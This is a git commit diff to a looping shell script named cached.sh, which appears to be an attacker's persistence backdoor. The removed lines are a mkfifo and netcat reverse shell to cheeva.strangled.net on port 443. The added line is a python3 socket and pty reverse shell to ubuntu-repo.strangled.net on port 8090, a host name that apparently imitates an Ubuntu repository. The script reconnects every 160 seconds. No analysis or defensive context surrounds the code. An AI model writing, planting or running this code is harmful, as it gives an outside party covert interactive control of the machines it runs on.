5af6bd22bc702c973368dac4933046067d53f2b6
secmonjp <fatmediajpn@gmail.com>
2026-06-14 16:00:42 +0900

    Update cached.sh

--- cached.sh
+++ cached.sh
@@ -1,9 +1,7 @@
 #!/bin/sh
 while true; do
 
-    rm -f /tmp/p && mkfifo /tmp/p
-
-    cat /tmp/p | /bin/sh -i 2>&1 | nc cheeva.strangled.net 443> /tmp/p &
+    python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ubuntu-repo.strangled.net",8090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 
 
     sleep 160
